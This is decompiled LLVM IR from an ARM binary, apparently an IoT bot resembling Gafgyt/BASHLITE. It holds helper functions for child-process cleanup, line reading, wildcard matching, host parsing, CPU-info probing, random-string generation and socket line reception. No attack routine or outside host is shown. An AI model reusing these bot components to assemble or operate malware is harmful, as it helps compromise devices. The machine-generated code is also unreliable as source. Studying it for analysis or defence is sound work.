  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_90b8 = load i32, i32* @global_var_32474.37, align 4
  %v2_90bc = icmp eq i32 %v2_90b8, 0
  br i1 %v2_90bc, label %dec_label_pc_9210, label %dec_label_pc_90c4

dec_label_pc_90c4:                                ; preds = %entry
  %v3_90c8 = mul i32 %arg1, 4
  %v2_90d8 = add i32 %v2_90b8, %v3_90c8
  %v1_90dc = inttoptr i32 %v2_90d8 to i32*
  %v2_90dc = load i32, i32* %v1_90dc, align 4
  %v2_90e0 = icmp eq i32 %v2_90dc, 0
  br i1 %v2_90e0, label %dec_label_pc_9210, label %dec_label_pc_90f4

dec_label_pc_90f4:                                ; preds = %dec_label_pc_90c4
  %v1_90f8 = call i32 @__GI_close(i32 %arg1)
  %v2_90fc = ptrtoint i32* %stack_var_-36 to i32
  %v2_9104 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_90fc, i32* @r0, align 4
  %v2_9114 = call i32 @__GI_sigaddset(i32 %v2_90fc, i32 2)
  store i32 %v2_90fc, i32* @r0, align 4
  %v2_9124 = call i32 @__GI_sigaddset(i32 %v2_90fc, i32 3)
  store i32 %v2_90fc, i32* @r0, align 4
  %v2_9134 = call i32 @__GI_sigaddset(i32 %v2_90fc, i32 1)
  %v2_913c = ptrtoint i32* %stack_var_-28 to i32
  %v4_9148 = bitcast i32* %stack_var_-36 to %_TYPEDEF_sigset_t*
  %v5_9148 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v4_9148, i32 %v2_913c, i32 %v2_90fc)
  %v2_9168 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_914c

dec_label_pc_914c:                                ; preds = %dec_label_pc_9190, %dec_label_pc_90f4
  %v2_915c = load i32, i32* @global_var_32474.37, align 4
  %v2_9160 = add i32 %v2_915c, %v3_90c8
  %v1_9164 = inttoptr i32 %v2_9160 to i32*
  %v2_9164 = load i32, i32* %v1_9164, align 4
  %v3_9178 = call i32 @__libc_waitpid(i32 %v2_9164, i32 %v2_9168, i32 0)
  %v3_9188 = icmp eq i32 %v3_9178, -1
  %v8_9188 = icmp eq i32 %v3_9178, -1
  br i1 %v3_9188, label %dec_label_pc_9190, label %dec_label_pc_91a4

dec_label_pc_9190:                                ; preds = %dec_label_pc_914c
  %v0_9190 = call i32 @__GI___errno_location()
  %v1_9198 = inttoptr i32 %v0_9190 to i32*
  %v2_9198 = load i32, i32* %v1_9198, align 4
  %v7_919c = icmp eq i32 %v2_9198, 4
  br i1 %v7_919c, label %dec_label_pc_914c, label %dec_label_pc_91a4

dec_label_pc_91a4:                                ; preds = %dec_label_pc_914c, %dec_label_pc_9190
  %v4_91b4 = bitcast i32* %stack_var_-28 to %_TYPEDEF_sigset_t*
  %v5_91b4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v4_91b4, i32 0, i32 %v2_913c)
  %v3_91bc = mul i32 %tmp5, 4
  %v2_91c8 = load i32, i32* @global_var_32474.37, align 4
  %v2_91cc = add i32 %v2_91c8, %v3_91bc
  %v2_91d4 = inttoptr i32 %v2_91cc to i32*
  store i32 0, i32* %v2_91d4, align 4
  br i1 %v8_9188, label %dec_label_pc_9210, label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a4
  %v3_91e4 = load i32, i32* %stack_var_-40, align 4
  %v1_91f0 = and i32 %v3_91e4, ptrtoint (i32* @global_var_ff00.45 to i32)
  %v3_91f4 = sdiv i32 %v1_91f0, 256
  br label %dec_label_pc_9210

dec_label_pc_9210:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_91a4, %entry, %dec_label_pc_90c4
  %storemerge3 = phi i32 [ -1, %dec_label_pc_90c4 ], [ -1, %entry ], [ %v3_91f4, %dec_label_pc_91e4 ], [ -1, %dec_label_pc_91a4 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_90fc, { 0, 2, 1, 4, 3, 6, 5 }
  uselistorder i32 %v3_90c8, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_32474.37, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9210, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a4, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9294

dec_label_pc_9254:                                ; preds = %dec_label_pc_92a4
  store i32 %v2_92b0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9270 = call i32 @__GI_read(i32 %arg3)
  %v1_9280 = add nuw i32 %storemerge25, 1
  %v7_928c = icmp eq i32 %v1_9270, 1
  br i1 %v7_928c, label %dec_label_pc_9294, label %dec_label_pc_92c4

dec_label_pc_9294:                                ; preds = %entry, %dec_label_pc_9254
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9280, %dec_label_pc_9254 ]
  %v6_92a0 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a0, label %dec_label_pc_92a4, label %dec_label_pc_92c4

dec_label_pc_92a4:                                ; preds = %dec_label_pc_9294
  %v2_92b0 = add i32 %storemerge25, %arg1
  %v1_92b4 = add i32 %v2_92b0, -1
  %v1_92b8 = inttoptr i32 %v1_92b4 to i8*
  %v2_92b8 = load i8, i8* %v1_92b8, align 1
  %v7_92bc = icmp eq i8 %v2_92b8, 10
  br i1 %v7_92bc, label %dec_label_pc_92c4, label %dec_label_pc_9254

dec_label_pc_92c4:                                ; preds = %dec_label_pc_92a4, %dec_label_pc_9294, %dec_label_pc_9254
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a4 ], [ 1, %dec_label_pc_9294 ], [ %v1_9270, %dec_label_pc_9254 ]
  %v2_92c8 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92c8, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b0, { 1, 0 }
  uselistorder i32 %v1_9270, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9294, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_93484 = load i8, i8* %arg1, align 1
  %v2_934c6 = icmp eq i8 %v2_93484, 0
  br i1 %v2_934c6, label %dec_label_pc_9360, label %dec_label_pc_9354

dec_label_pc_9314:                                ; preds = %dec_label_pc_9354
  %v3_9318 = mul i32 %stack_var_-20.07, 16
  %v4_931c = ptrtoint i8* %v3_9338 to i32
  %v2_9320 = load i8, i8* %v3_9338, align 1
  %v3_9320 = zext i8 %v2_9320 to i32
  %v4_932c = mul nuw nsw i32 %v3_9320, 4
  %v5_932c = add i32 %v4_932c, ptrtoint (i32* @global_var_1f518.47 to i32)
  %v6_932c = inttoptr i32 %v5_932c to i32*
  %v7_932c = load i32, i32* %v6_932c, align 4
  %v2_9330 = or i32 %v7_932c, %v3_9318
  %v1_933c = add i32 %v4_931c, 1
  %v5_9340 = inttoptr i32 %v1_933c to i8*
  %v2_9348 = load i8, i8* %v5_9340, align 1
  %v2_934c = icmp eq i8 %v2_9348, 0
  br i1 %v2_934c, label %dec_label_pc_9360, label %dec_label_pc_9354

dec_label_pc_9354:                                ; preds = %entry, %dec_label_pc_9314
  %v3_9338 = phi i8* [ %v5_9340, %dec_label_pc_9314 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9330, %dec_label_pc_9314 ], [ 0, %entry ]
  %v1_9358 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_9358, label %dec_label_pc_9360, label %dec_label_pc_9314

dec_label_pc_9360:                                ; preds = %dec_label_pc_9314, %dec_label_pc_9354, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9330, %dec_label_pc_9314 ], [ %stack_var_-20.07, %dec_label_pc_9354 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9360, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9354, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_9378 = load i32, i32* @r4, align 4
  %v6_9378 = load i32, i32* @fp, align 4
  store i32 37760, i32* %stack_var_-4, align 4
  %v2_937c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_937c, i32* @fp, align 4
  %v2_9390 = load i8, i8* %arg1, align 1
  %v7_939c = icmp eq i8 %v2_9390, 42
  br i1 %v7_939c, label %dec_label_pc_93d0, label %dec_label_pc_93a4

dec_label_pc_93a4:                                ; preds = %entry
  %v7_93a8 = icmp eq i8 %v2_9390, 63
  br i1 %v7_93a8, label %dec_label_pc_9440, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %dec_label_pc_93a4
  %v2_93b4 = icmp eq i8 %v2_9390, 0
  br i1 %v2_93b4, label %dec_label_pc_93c0, label %dec_label_pc_9498

dec_label_pc_93c0:                                ; preds = %dec_label_pc_93b0
  %v2_93c4 = load i8, i8* %tmp, align 1
  %v3_93c4 = zext i8 %v2_93c4 to i32
  br label %dec_label_pc_950c

dec_label_pc_93d0:                                ; preds = %entry
  %v1_93d4 = add i32 %tmp8, 1
  %v3_93e0 = inttoptr i32 %v1_93d4 to i8*
  %v4_93e0 = call i32 @wildString(i8* %v3_93e0, i32 %arg2)
  %v2_93e8 = icmp eq i32 %v4_93e0, 0
  br i1 %v2_93e8, label %dec_label_pc_942c, label %dec_label_pc_93f0

dec_label_pc_93f0:                                ; preds = %dec_label_pc_93d0
  %v2_93f4 = load i8, i8* %tmp, align 1
  %v2_93f8 = icmp eq i8 %v2_93f4, 0
  br i1 %v2_93f8, label %dec_label_pc_9434, label %dec_label_pc_9400

dec_label_pc_9400:                                ; preds = %dec_label_pc_93f0
  %v1_9404 = add i32 %arg2, 1
  %v4_9410 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9404)
  %v2_9418 = icmp eq i32 %v4_9410, 0
  br i1 %v2_9418, label %dec_label_pc_942c, label %dec_label_pc_9434

dec_label_pc_942c:                                ; preds = %dec_label_pc_9400, %dec_label_pc_93d0
  br label %dec_label_pc_9434

dec_label_pc_9434:                                ; preds = %dec_label_pc_93f0, %dec_label_pc_9400, %dec_label_pc_942c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_942c ], [ 1, %dec_label_pc_9400 ], [ 1, %dec_label_pc_93f0 ]
  br label %dec_label_pc_950c

dec_label_pc_9440:                                ; preds = %dec_label_pc_93a4
  %v2_9444 = load i8, i8* %tmp, align 1
  %v2_9448 = icmp eq i8 %v2_9444, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9440
  %v1_9454 = add i32 %tmp8, 1
  %v1_945c = add i32 %arg2, 1
  %v2_9468 = inttoptr i32 %v1_9454 to i8*
  %v3_9468 = call i32 @wildString(i8* %v2_9468, i32 %v1_945c)
  %v2_9470 = icmp ne i32 %v3_9468, 0
  %. = zext i1 %v2_9470 to i32
  br label %dec_label_pc_948c

dec_label_pc_948c:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9440
  %storemerge2 = phi i32 [ 1, %dec_label_pc_9440 ], [ %., %dec_label_pc_9450 ]
  br label %dec_label_pc_950c

dec_label_pc_9498:                                ; preds = %dec_label_pc_93b0
  %v2_949c = load i8, i8* %arg1, align 1
  %v3_949c = zext i8 %v2_949c to i32
  %v1_94a4 = call i32 @__GI_toupper(i32 %v3_949c)
  store i32 %v1_94a4, i32* @r4, align 4
  %v2_94b0 = load i8, i8* %tmp, align 1
  %v3_94b0 = zext i8 %v2_94b0 to i32
  %v1_94b8 = call i32 @__GI_toupper(i32 %v3_94b0)
  %v0_94c0 = load i32, i32* @r4, align 4
  %v9_94c0 = icmp eq i32 %v0_94c0, %v1_94b8
  br i1 %v9_94c0, label %dec_label_pc_94c8, label %dec_label_pc_9504

dec_label_pc_94c8:                                ; preds = %dec_label_pc_9498
  %v1_94cc = add i32 %tmp8, 1
  %v1_94d4 = add i32 %arg2, 1
  %v2_94e0 = inttoptr i32 %v1_94cc to i8*
  %v3_94e0 = call i32 @wildString(i8* %v2_94e0, i32 %v1_94d4)
  %v2_94e8 = icmp ne i32 %v3_94e0, 0
  %.7 = zext i1 %v2_94e8 to i32
  br label %dec_label_pc_9504

dec_label_pc_9504:                                ; preds = %dec_label_pc_94c8, %dec_label_pc_9498
  %storemerge = phi i32 [ 1, %dec_label_pc_9498 ], [ %.7, %dec_label_pc_94c8 ]
  br label %dec_label_pc_950c

dec_label_pc_950c:                                ; preds = %dec_label_pc_948c, %dec_label_pc_9434, %dec_label_pc_93c0, %dec_label_pc_9504
  %stack_var_-44.0 = phi i32 [ %storemerge3, %dec_label_pc_9434 ], [ %storemerge2, %dec_label_pc_948c ], [ %v3_93c4, %dec_label_pc_93c0 ], [ %storemerge, %dec_label_pc_9504 ]
  store i32 %v3_9378, i32* @r4, align 4
  store i32 %v6_9378, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_950c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9434, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_953c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_953c, i32* %arg2, align 4
  %v3_9554 = icmp eq i32 %v1_953c, -1
  %. = zext i1 %v3_9554 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9590 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9590 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95c83 = load i8, i8* %storemerge2, align 1
  %v2_95cc5 = icmp eq i8 %v2_95c83, 0
  br i1 %v2_95cc5, label %dec_label_pc_95d4, label %dec_label_pc_9598

dec_label_pc_9598:                                ; preds = %entry, %dec_label_pc_9598
  %v2_95d48 = phi i8* [ %storemerge, %dec_label_pc_9598 ], [ %storemerge2, %entry ]
  %v2_959c = load i8, i8* %v2_95d48, align 1
  %v3_959c = zext i8 %v2_959c to i32
  store i32 %v3_959c, i32* %r0.global-to-local, align 4
  %v1_95a4 = call i32 @__GI_toupper(i32 %v3_959c)
  store i32 %v1_95a4, i32* %r0.global-to-local, align 4
  %v3_95b0 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b4 = trunc i32 %v1_95a4 to i8
  store i8 %v1_95b4, i8* %v3_95b0, align 1
  %v4_95b8 = ptrtoint i8* %v3_95b0 to i32
  %v1_95bc = add i32 %v4_95b8, 1
  %storemerge = inttoptr i32 %v1_95bc to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95c8 = load i8, i8* %storemerge, align 1
  %v2_95cc = icmp eq i8 %v2_95c8, 0
  br i1 %v2_95cc, label %dec_label_pc_95c4.dec_label_pc_95d4_crit_edge, label %dec_label_pc_9598

dec_label_pc_95c4.dec_label_pc_95d4_crit_edge:    ; preds = %dec_label_pc_9598
  %v13_95d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d4

dec_label_pc_95d4:                                ; preds = %dec_label_pc_95c4.dec_label_pc_95d4_crit_edge, %entry
  %v13_95d4 = phi i32 [ %v13_95d4.pre, %dec_label_pc_95c4.dec_label_pc_95d4_crit_edge ], [ %v0_9590, %entry ]
  ret i32 %v13_95d4

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9598, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4124 = alloca i32, align 4
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_95dc = load i32, i32* @r4, align 4
  store i32 %v3_95dc, i32* %stack_var_-20, align 4
  %v16_95dc = ptrtoint i32* %stack_var_-20 to i32
  store i32 -4108, i32* @r3, align 4
  store i32 %v16_95dc, i32* @r2, align 4
  %v4_9604 = call i32 @__GI_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f918.49, i32 0, i32 0), i32 0)
  %v2_97bc = ptrtoint i32* %stack_var_-4124 to i32
  %v1_9624 = bitcast i32* %stack_var_-4124 to i8*
  br label %dec_label_pc_97b4

dec_label_pc_9614:                                ; preds = %dec_label_pc_97b4
  %v2_9624 = call i32 @uppercase(i8* %v1_9624)
  %v4_963c = call i32 @strstr(i32 %v2_97bc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f928.51, i32 0, i32 0))
  %v9_9654 = icmp eq i32 %v4_963c, %v2_97bc
  br i1 %v9_9654, label %dec_label_pc_965c, label %dec_label_pc_9798

dec_label_pc_965c:                                ; preds = %dec_label_pc_9614
  %tmp19 = bitcast i32* %stack_var_-4116 to i8*
  br label %dec_label_pc_9680

dec_label_pc_9674:                                ; preds = %dec_label_pc_96a0, %dec_label_pc_9690, %dec_label_pc_9680
  %v1_9678 = add i32 %v4_9680, 1
  %v5_967c = inttoptr i32 %v1_9678 to i8*
  br label %dec_label_pc_9680

dec_label_pc_9680:                                ; preds = %dec_label_pc_965c, %dec_label_pc_9674
  %storemerge2 = phi i8* [ %v5_967c, %dec_label_pc_9674 ], [ %tmp19, %dec_label_pc_965c ]
  %v4_9680 = ptrtoint i8* %storemerge2 to i32
  %v2_9684 = load i8, i8* %storemerge2, align 1
  %v7_9688 = icmp eq i8 %v2_9684, 32
  br i1 %v7_9688, label %dec_label_pc_9674, label %dec_label_pc_9690

dec_label_pc_9690:                                ; preds = %dec_label_pc_9680
  %v2_9694 = load i8, i8* %storemerge2, align 1
  %v7_9698 = icmp eq i8 %v2_9694, 9
  br i1 %v7_9698, label %dec_label_pc_9674, label %dec_label_pc_96a0

dec_label_pc_96a0:                                ; preds = %dec_label_pc_9690
  %v2_96a4 = load i8, i8* %storemerge2, align 1
  %v7_96a8 = icmp eq i8 %v2_96a4, 58
  br i1 %v7_96a8, label %dec_label_pc_9674, label %dec_label_pc_96d8.preheader

dec_label_pc_96d8.preheader:                      ; preds = %dec_label_pc_96a0
  %v1_96dc = add i32 %v4_9680, -1
  br label %dec_label_pc_96d8

dec_label_pc_96b4:                                ; preds = %dec_label_pc_9700, %dec_label_pc_96d8
  %v3_96c4 = call i32 @strlen(i8* %storemerge2)
  %v2_96cc = add i32 %v1_96dc, %v3_96c4
  %v3_96d4 = inttoptr i32 %v2_96cc to i8*
  store i8 0, i8* %v3_96d4, align 1
  br label %dec_label_pc_96d8

dec_label_pc_96d8:                                ; preds = %dec_label_pc_96d8.preheader, %dec_label_pc_96b4
  %v3_96e8 = call i32 @strlen(i8* %storemerge2)
  %v2_96f0 = add i32 %v1_96dc, %v3_96e8
  %v1_96f4 = inttoptr i32 %v2_96f0 to i8*
  %v2_96f4 = load i8, i8* %v1_96f4, align 1
  %v7_96f8 = icmp eq i8 %v2_96f4, 13
  br i1 %v7_96f8, label %dec_label_pc_96b4, label %dec_label_pc_9700

dec_label_pc_9700:                                ; preds = %dec_label_pc_96d8
  store i32 %v1_96dc, i32* @r4, align 4
  %v3_9710 = call i32 @strlen(i8* %storemerge2)
  %v0_9718 = load i32, i32* @r4, align 4
  %v2_9718 = add i32 %v0_9718, %v3_9710
  %v1_971c = inttoptr i32 %v2_9718 to i8*
  %v2_971c = load i8, i8* %v1_971c, align 1
  %v7_9720 = icmp eq i8 %v2_971c, 10
  br i1 %v7_9720, label %dec_label_pc_96b4, label %dec_label_pc_9728

dec_label_pc_9728:                                ; preds = %dec_label_pc_9700
  %v2_9734 = call i32 @__GI_strchr(i32 %v4_9680, i32 46)
  %v2_973c = icmp eq i32 %v2_9734, 0
  br i1 %v2_973c, label %dec_label_pc_9760, label %dec_label_pc_9744

dec_label_pc_9744:                                ; preds = %dec_label_pc_9728
  %v2_9750 = call i32 @__GI_strchr(i32 %v4_9680, i32 46)
  %v3_975c = inttoptr i32 %v2_9750 to i8*
  store i8 0, i8* %v3_975c, align 1
  br label %dec_label_pc_9760

dec_label_pc_9760:                                ; preds = %dec_label_pc_9728, %dec_label_pc_9744
  store i32 %v4_9680, i32* @r1, align 4
  %v2_977c = inttoptr i32 %arg1 to i8*
  %v3_977c = call i32 @strcpy(i8* %v2_977c, i32 %v4_9680)
  %v1_9784 = call i32 @__GI_close(i32 %v4_9604)
  br label %dec_label_pc_97f0

dec_label_pc_9798:                                ; preds = %dec_label_pc_9614
  store i32 4096, i32* @r2, align 4
  %v3_97b0 = call i32 @__GI_memset(i8* %v1_9624, i32 0)
  br label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %entry, %dec_label_pc_9798
  %v4_97cc = call i32 @fdgets(i32 %v2_97bc, i32 4096, i32 %v4_9604, i32 %v2_97bc)
  %v2_97d4 = icmp eq i32 %v4_97cc, 0
  br i1 %v2_97d4, label %dec_label_pc_97dc, label %dec_label_pc_9614

dec_label_pc_97dc:                                ; preds = %dec_label_pc_97b4
  %v1_97e0 = call i32 @__GI_close(i32 %v4_9604)
  br label %dec_label_pc_97f0

dec_label_pc_97f0:                                ; preds = %dec_label_pc_9760, %dec_label_pc_97dc
  %storemerge4 = phi i32 [ 1, %dec_label_pc_97dc ], [ 0, %dec_label_pc_9760 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_96dc, { 2, 1, 0 }
  uselistorder i32 %v4_9680, { 2, 1, 0, 3, 4, 5 }
  uselistorder i8* %storemerge2, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_97bc, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9604, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %dec_label_pc_97f0, { 1, 0 }
  uselistorder label %dec_label_pc_97b4, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_96d8, { 1, 0 }
  uselistorder label %dec_label_pc_9680, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_981c = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v4_9830 = call i32 @__GI_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f918.49, i32 0, i32 0), i32 0)
  %v1_9850 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_98ac

dec_label_pc_9840:                                ; preds = %dec_label_pc_98ac
  %v2_9850 = call i32 @uppercase(i8* %v1_9850)
  %v4_9868 = call i32 @strstr(i32 %v2_981c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f928.51, i32 0, i32 0))
  %v9_987c = icmp eq i32 %v4_9868, %v2_981c
  br i1 %v9_987c, label %dec_label_pc_9884, label %dec_label_pc_9890

dec_label_pc_9884:                                ; preds = %dec_label_pc_9840
  %v1_9888 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9890

dec_label_pc_9890:                                ; preds = %dec_label_pc_9840, %dec_label_pc_9884
  %stack_var_-24.0 = phi i32 [ %v1_9888, %dec_label_pc_9884 ], [ %stack_var_-24.1, %dec_label_pc_9840 ]
  store i32 4096, i32* @r2, align 4
  %v3_98a8 = call i32 @__GI_memset(i8* %v1_9850, i32 0)
  br label %dec_label_pc_98ac

dec_label_pc_98ac:                                ; preds = %entry, %dec_label_pc_9890
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9890 ]
  %v4_98c4 = call i32 @fdgets(i32 %v2_981c, i32 4096, i32 %v4_9830, i32 %v2_981c)
  %v2_98cc = icmp eq i32 %v4_98c4, 0
  br i1 %v2_98cc, label %dec_label_pc_98d4, label %dec_label_pc_9840

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98ac
  %v1_98d8 = call i32 @__GI_close(i32 %v4_9830)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_981c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_98ac, { 1, 0 }
  uselistorder label %dec_label_pc_9890, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_98f8 = load i32, i32* @r4, align 4
  %v6_98f8 = load i32, i32* @fp, align 4
  %v0_9904 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_997017 = icmp sgt i32 %arg2, 0
  br i1 %v5_997017, label %dec_label_pc_9920, label %dec_label_pc_9974

dec_label_pc_9920:                                ; preds = %entry, %dec_label_pc_9920
  %storemerge118 = phi i32 [ %v1_995c, %dec_label_pc_9920 ], [ 0, %entry ]
  %v2_992c = add i32 %storemerge118, %v0_9904
  store i32 %v2_992c, i32* @r4, align 4
  %v0_9930 = call i32 @rand_cmwc()
  %v2_9940 = urem i32 %v0_9930, 26
  store i32 %v2_9940, i32* %r0.global-to-local, align 4
  %v1_994c = add nuw nsw i32 %v2_9940, 65
  %v1_9954 = trunc i32 %v1_994c to i8
  %v2_9954 = load i32, i32* @r4, align 4
  %v3_9954 = inttoptr i32 %v2_9954 to i8*
  store i8 %v1_9954, i8* %v3_9954, align 1
  %v1_995c = add i32 %storemerge118, 1
  %v3_9968.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9970 = icmp slt i32 %v1_995c, %v3_9968.pre
  br i1 %v5_9970, label %dec_label_pc_9920, label %dec_label_pc_9964.dec_label_pc_9974_crit_edge

dec_label_pc_9964.dec_label_pc_9974_crit_edge:    ; preds = %dec_label_pc_9920
  %v12_9978.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9974

dec_label_pc_9974:                                ; preds = %dec_label_pc_9964.dec_label_pc_9974_crit_edge, %entry
  %v12_9978 = phi i32 [ %v12_9978.pre, %dec_label_pc_9964.dec_label_pc_9974_crit_edge ], [ %v0_9904, %entry ]
  store i32 %v3_98f8, i32* @r4, align 4
  store i32 %v6_98f8, i32* @fp, align 4
  ret i32 %v12_9978

; uselistorder directives
  uselistorder i32 %v1_995c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_9920, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99d0.lr.ph:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9980 = load i32, i32* @fp, align 4
  store i32 %v3_9980, i32* %stack_var_-16, align 4
  store i32 39304, i32* %stack_var_-4, align 4
  %v2_9984 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9984, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_99a8 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_99bc = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_99d0

dec_label_pc_99d0:                                ; preds = %dec_label_pc_99d0.lr.ph, %dec_label_pc_99d0
  %storemerge628 = phi i32 [ 0, %dec_label_pc_99d0.lr.ph ], [ %v1_99e4, %dec_label_pc_99d0 ]
  %v5_99dc = mul nuw nsw i32 %storemerge628, 4
  %v6_99dc = add i32 %v5_99dc, %v2_99bc
  %v7_99dc = inttoptr i32 %v6_99dc to i32*
  store i32 0, i32* %v7_99dc, align 4
  %v1_99e4 = add nuw nsw i32 %storemerge628, 1
  %tmp53 = icmp ult i32 %v1_99e4, 32
  br i1 %tmp53, label %dec_label_pc_99d0, label %dec_label_pc_99f8

dec_label_pc_99f8:                                ; preds = %dec_label_pc_99d0
  %v13_9980 = ptrtoint i32* %stack_var_-16 to i32
  %v3_99fc = udiv i32 %arg1, 32
  %v3_9a08 = mul nuw nsw i32 %v3_99fc, 4
  %v2_9a10 = add nsw i32 %v3_9a08, -160
  %v2_9a14 = add i32 %v2_9a10, %v13_9980
  %v1_9a18 = inttoptr i32 %v2_9a14 to i32*
  %v2_9a18 = load i32, i32* %v1_9a18, align 4
